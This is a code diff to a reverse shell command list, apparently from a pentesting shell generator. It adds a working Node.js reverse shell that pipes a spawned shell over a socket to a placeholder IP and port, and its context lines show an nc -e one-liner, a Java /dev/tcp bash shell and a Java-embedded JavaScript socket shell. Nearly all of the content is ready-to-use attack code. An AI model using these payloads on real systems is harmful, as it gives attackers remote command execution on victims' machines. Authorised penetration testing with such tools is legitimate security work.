@@ -249,6 +249,11 @@ const reverseShellCommands = withCommandType(
             "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
             "meta": ["linux", "mac"]
         },
+	{
+            "name": "node.js #2",
+            "command": "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"\{shell}\", []);\r\n    var client = new net.Socket();\r\n    client.connect({port}, \"{ip}\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return \/a\/; \/\/ Prevents the Node.js application from crashing\r\n})();",
+            "meta": ["linux", "mac", "windows"]
+        },
 	    {
             "name": "Java #1",
             "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
@@ -267,7 +272,7 @@ const reverseShellCommands = withCommandType(
 	{ 
    	   "name": "Javascript",
 	   "command":"String command = \"var host = \'{ip}\';\" +\r\n                       \"var port = {port};\" +\r\n                       \"var cmd = \'{shell}\';\"+\r\n                       \"var s = new java.net.Socket(host, port);\" +\r\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n                       \"print (\'Connected\');\"+\r\n                       \"while (!s.isClosed()) {\"+\r\n                       \"    while (pi.available() > 0)\"+\r\n                       \"        so.write(pi.read());\"+\r\n                       \"    while (pe.available() > 0)\"+\r\n                       \"        so.write(pe.read());\"+\r\n                       \"    while (si.available() > 0)\"+\r\n                       \"        po.write(si.read());\"+\r\n                       \"    so.flush();\"+\r\n                       \"    po.flush();\"+\r\n                       \"    java.lang.Thread.sleep(50);\"+\r\n                       \"    try {\"+\r\n                       \"        p.exitValue();\"+\r\n                       \"        break;\"+\r\n                       \"    }\"+\r\n                       \"    catch (e) {\"+\r\n                       \"    }\"+\r\n                       \"}\"+\r\n                       \"p.destroy();\"+\r\n                       \"s.close();\";\r\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\nref.add(new StringRefAddr(\"x\", x);",
-   	   "meta":["windows"]
+   	   "meta":["linux", "mac", "windows"]
        },
 	{ 
    	   "name": "Groovy",
